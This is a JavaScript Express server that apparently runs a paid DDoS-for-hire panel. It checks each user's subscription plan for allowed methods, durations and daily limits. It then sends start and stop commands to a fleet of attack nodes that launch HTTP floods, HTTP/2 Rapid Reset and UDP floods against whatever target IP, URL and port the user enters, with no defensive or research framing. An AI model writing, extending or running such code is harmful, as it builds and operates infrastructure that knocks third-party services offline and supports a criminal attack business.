import express from "express";
import { createClient } from "@supabase/supabase-js";

const app = express();
app.use(express.json());

const SUPABASE_URL = "https://fyzbqbubsdkjrmppkdsl.supabase.co";
const SUPABASE_SERVICE_KEY = process.env.VITE_SUPABASE_SERVICE_KEY;

const supabaseAdmin = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
  auth: { autoRefreshToken: false, persistSession: false },
});

// Valid method sets
const L4_METHODS = new Set(["UDP-NORMAL", "UDP-BYPASS"]);
const L7_METHODS = new Set(["HTTP-GET", "HTTP-POST", "API-FLOOD", "RAPID-RESET"]);

// ── Auth + policy middleware ───────────────────────────────────────────────────
// Verifies JWT, loads profile+plan, attaches req.user / req.profile / req.isAdmin
async function requireAuth(req, res, next) {
  const token = req.headers.authorization?.replace("Bearer ", "");
  if (!token) return res.status(401).json({ error: "Unauthorized" });

  const { data: { user }, error: authErr } = await supabaseAdmin.auth.getUser(token);
  if (authErr || !user) return res.status(401).json({ error: "Unauthorized" });

  // Load profile with plan
  const { data: profile, error: profileErr } = await supabaseAdmin
    .from("profiles")
    .select("id, is_admin, plan_id, plan:plans(id, name, methods, access_layers, max_duration, max_daily_runs)")
    .eq("id", user.id)
    .single();

  if (profileErr || !profile) return res.status(403).json({ error: "Profile not found" });

  req.user    = user;
  req.profile = profile;
  req.isAdmin = !!profile.is_admin;
  next();
}

// ── Policy check helper ───────────────────────────────────────────────────────
// Returns { ok: true } or { ok: false, status, error }
async function checkPolicy(req, layer, method, duration) {
  const { isAdmin, profile } = req;
  const plan = profile.plan;

  // Must have a plan (unless admin)
  if (!isAdmin && !plan) return { ok: false, status: 403, error: "No plan assigned to your account" };

  if (!isAdmin) {
    // Layer access
    if (!plan.access_layers?.includes(layer))
      return { ok: false, status: 403, error: `Your plan does not include ${layer} access` };

    // Method access
    if (!plan.methods?.includes(method))
      return { ok: false, status: 403, error: `Your plan does not include the ${method} method` };

    // Duration cap
    if (plan.max_duration > 0 && duration > plan.max_duration)
      return { ok: false, status: 403, error: `Duration ${duration}s exceeds your plan limit of ${plan.max_duration}s` };

    // Daily run limit
    if (plan.max_daily_runs > 0) {
      const startOfDay = new Date();
      startOfDay.setHours(0, 0, 0, 0);
      const table = layer === "L4" ? "l4_runs" : "l7_runs";
      const { count } = await supabaseAdmin
        .from(table)
        .select("id", { count: "exact", head: true })
        .eq("user_id", req.user.id)
        .gte("created_at", startOfDay.toISOString());
      if ((count ?? 0) >= plan.max_daily_runs)
        return { ok: false, status: 429, error: `Daily limit reached (${plan.max_daily_runs} runs/day). Resets at midnight.` };
    }
  }

  // Busy check — no concurrent runs allowed regardless of plan
  const rpcName = layer === "L4" ? "is_l4_busy" : "is_l7_busy";
  const { data: busy } = await supabaseAdmin.rpc(rpcName);
  if (busy) return { ok: false, status: 409, error: `An ${layer} attack is already running. Wait for it to finish.` };

  return { ok: true };
}

// ── Helper: fire a fetch with timeout ────────────────────────────────────────
async function fetchWithTimeout(url, options, ms = 15000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), ms);
  try {
    return await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

// ── POST /proxy/l7/start ──────────────────────────────────────────────────────
app.post("/proxy/l7/start", requireAuth, async (req, res) => {
  const { target, method, duration } = req.body;

  // Input validation
  if (!target || typeof target !== "string" || !target.trim())
    return res.status(400).json({ error: "Invalid target" });
  if (!L7_METHODS.has(method))
    return res.status(400).json({ error: `Invalid L7 method: ${method}` });
  const dur = parseInt(duration, 10);
  if (!dur || dur < 1)
    return res.status(400).json({ error: "Invalid duration" });

  // Policy enforcement
  const policy = await checkPolicy(req, "L7", method, dur);
  if (!policy.ok) return res.status(policy.status).json({ error: policy.error });

  // Fetch nodes
  const { data: apis, error } = await supabaseAdmin.from("layer7_apis").select("url");
  if (error) return res.status(500).json({ error: "Failed to fetch L7 nodes" });
  if (!apis?.length) return res.json({ total: 0, online: 0, results: [] });

  // Build body server-side — client cannot override workers/rate_delay
  const body = {
    target:     target.trim(),
    method:     method.toLowerCase().replace(/-/g, ""),
    duration:   dur,
    workers:    2048,
    verbose:    false,
    rate_delay: 0,
  };

  // Pre-flight stop
  await Promise.allSettled(
    apis.map((api) => fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {}))
  );
  await new Promise((r) => setTimeout(r, 500));

  // Fire start
  const settled = await Promise.allSettled(
    apis.map(async (api) => {
      try {
        const r = await fetchWithTimeout(`${api.url}/api/attack/start`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
        const data = await r.json();
        return { success: true, data };
      } catch (err) {
        return { success: false, error: err.name === "AbortError" ? "timed out (15 s)" : err.message };
      }
    })
  );

  const results = settled.map((s) =>
    s.status === "fulfilled" ? s.value : { success: false, error: s.reason?.message ?? String(s.reason) }
  );
  const online = results.filter((r) => r.success).length;
  res.json({ total: apis.length, online, results });
});

// ── POST /proxy/l7/stop ───────────────────────────────────────────────────────
app.post("/proxy/l7/stop", requireAuth, async (req, res) => {
  const { data: apis } = await supabaseAdmin.from("layer7_apis").select("url");
  if (apis?.length) {
    await Promise.allSettled(
      apis.map((api) => fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {}))
    );
  }
  res.json({ ok: true });
});

// ── POST /proxy/l4/start ──────────────────────────────────────────────────────
app.post("/proxy/l4/start", requireAuth, async (req, res) => {
  const { target, port, method, duration } = req.body;

  // Input validation
  if (!target || typeof target !== "string" || !target.trim())
    return res.status(400).json({ error: "Invalid target" });
  if (!L4_METHODS.has(method))
    return res.status(400).json({ error: `Invalid L4 method: ${method}` });
  const dur = parseInt(duration, 10);
  if (!dur || dur < 1)
    return res.status(400).json({ error: "Invalid duration" });
  if (method === "UDP-NORMAL") {
    const p = parseInt(port, 10);
    if (!p || p < 1 || p > 65535)
      return res.status(400).json({ error: "Invalid port" });
  }

  // Policy enforcement
  const policy = await checkPolicy(req, "L4", method, dur);
  if (!policy.ok) return res.status(policy.status).json({ error: policy.error });

  // Fetch nodes
  const { data: apis, error } = await supabaseAdmin.from("layer4_apis").select("url");
  if (error) return res.status(500).json({ error: "Failed to fetch L4 nodes" });
  if (!apis?.length) return res.json({ total: 0, online: 0, results: [] });

  // Build body server-side
  const body =
    method === "UDP-NORMAL"
      ? { method: 1, ip: target.trim(), port: parseInt(port, 10), duration: dur }
      : { method: 2, ip: target.trim(), time: dur };

  // Fire
  const settled = await Promise.allSettled(
    apis.map(async (api) => {
      try {
        const r = await fetchWithTimeout(`${api.url}/api/hit`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
        const data = await r.json();
        if (!data?.instance_id) throw new Error("No instance_id in response");
        return { success: true, instance_id: data.instance_id };
      } catch (err) {
        return { success: false, error: err.name === "AbortError" ? "timed out (15 s)" : err.message };
      }
    })
  );

  const results = settled.map((s) =>
    s.status === "fulfilled" ? s.value : { success: false, error: s.reason?.message ?? String(s.reason) }
  );
  const online = results.filter((r) => r.success).length;
  res.json({ total: apis.length, online, results });
});

// ── POST /proxy/l4/stop ───────────────────────────────────────────────────────
app.post("/proxy/l4/stop", requireAuth, async (req, res) => {
  const { data: apis } = await supabaseAdmin.from("layer4_apis").select("url");
  if (apis?.length) {
    await Promise.allSettled(
      apis.map((api) => fetch(`${api.url}/api/stop/all`, { method: "POST" }).catch(() => {}))
    );
  }
  res.json({ ok: true });
});

const PORT = 3001;
app.listen(PORT, () => console.log(`[proxy] Server running on port ${PORT}`));
